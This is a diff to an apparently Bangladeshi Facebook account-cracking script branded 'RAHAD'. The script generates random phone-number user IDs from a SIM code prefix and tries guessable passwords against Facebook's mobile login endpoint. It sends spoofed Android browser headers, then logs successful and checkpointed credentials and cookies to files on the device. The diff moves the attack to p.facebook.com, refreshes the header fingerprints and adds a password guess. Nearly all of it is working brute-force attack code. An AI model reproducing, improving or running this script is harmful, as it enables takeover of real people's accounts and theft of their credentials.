@@ -28,7 +28,7 @@ for ua in range(5000):
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
       y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
-      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
       d=random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
@@ -79,9 +79,9 @@ P = '\033[1;37m'
 def fuck():
     user=[]
     os.system('clear')
-    os.system('xdg-open https://facebook.com/www.xnx.com9')
+    os.system('xdg-open https://facebook.com/Rowdybrandx')
     print(logo)
-    print('[+] SIM CODE BD=> 016•017•018•019')
+    print('[+] SIM CODE BD=> 016×017•018×019')
     nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
     nudex = ''.join(random.choice(string.digits) for _ in range(2))
     nud = ''.join(random.choice(string.digits) for _ in range(2))
@@ -101,7 +101,7 @@ def fuck():
         print('\033[1;32m─────────────────────────────────────────────────────────')
         for guru in user:
             uid = nude+nudex+nud+guru
-            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
+            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla','09876543']
             MUEOR.submit(rcrack,uid,pwx,tl)
     print('\033[1;32m─────────────────────────────────────────────────────────')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
@@ -118,7 +118,7 @@ def rcrack(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sRAHAD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -129,24 +129,27 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-            'authority': 'x.facebook.com',
+            header_freefb = {'authority': 'p.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
+            'dpr': '1.712499976158142',
             'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.58"',
             'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Infinix X688B"',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro,}
-            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -158,7 +161,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[RAHAD-CP💔] {uid} • {ps}")
+                print(f"\x1b[38;5;196m[RAHAD-CP💔] {uid} ~ {ps}")
                 open('/sdcard/RAHAD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
